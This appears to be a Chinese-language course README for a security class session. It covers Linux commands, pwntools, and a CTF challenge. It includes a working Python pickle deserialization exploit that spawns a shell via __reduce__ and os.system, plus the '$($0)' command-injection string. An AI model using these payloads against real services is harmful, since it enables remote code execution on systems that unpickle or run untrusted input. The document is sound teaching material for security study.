# Slides
 * [Linux_and_SA](Linux_and_SA.pptx)
 * [Python](Python.pptx)
 
## Linux and System Admin
 * **Linux Common Command**
  * `echo $0`: 印出目前在跑的process名稱
   * 如果是$($0) => $() 開啟shell，$0 => 就是shell！
   * 交大網路安全實務期末互打比賽，每個主機上有可以執行任何command的漏洞，大家都忙著寫script過濾command，據說很多人被```$($0)```打死XD
  * `touch`: create an empty file, `cat file`: print file content to stdout, `nc`: create TCP/UDP connection/listen, `cmd1 | cmd2`: pipe stdout of cmd1 as stdin of cmd2
 * **Kali Linux**：綜合了各種滲透測試工具的作業系統，Ubuntu的好親戚

## Python
 * **Socket**： basic module for TCP/UDP connections
 * **Struct**：把byte包裝成little-endian 或是 big-endian的模組
 * **Pwntools**：有超多好用的工具
  * TCP/UDP connection：只要一行XD 還有interactive module
  * 寫shellcode, working with elf, gdb, memory leak, rop chain, translate assembly to string, ...

# Today's Vulnerable
pickle 是個可以把class serialized 和deserialized 的module，以下程式能叫出shell！
 ```python
  import pickle
  import os
  class Exploit(object):
    def __reduce__(self):
      comm = "sh"
      return (os.system, (comm,))
a = pickle.dumps(Exploit()) # searlized to String
b = pickle.loads(a) # desearlized from String
```
## Remark
 * deserialized回來時，需要告訴python 要怎麼還原回來，而這個還原方法就是在 `__reduce__(self)`裡指定。
=> 也就是，反serialized時會call `__reduce__(self)`
 *  `__reduce__(self)` 回傳的格式：[desearlized_function][argument to desearlized_function]
 => `(os.system, (comm,))` 會desearlized成 `os.system("sh")`，***calling shell***!

# Get the Flag
1. [Pickle](Pickle)
 * server： `nc 140.113.194.85 49167`
 * [server code](Pickle/spam.py)
 * Hint: pickle vulnerable
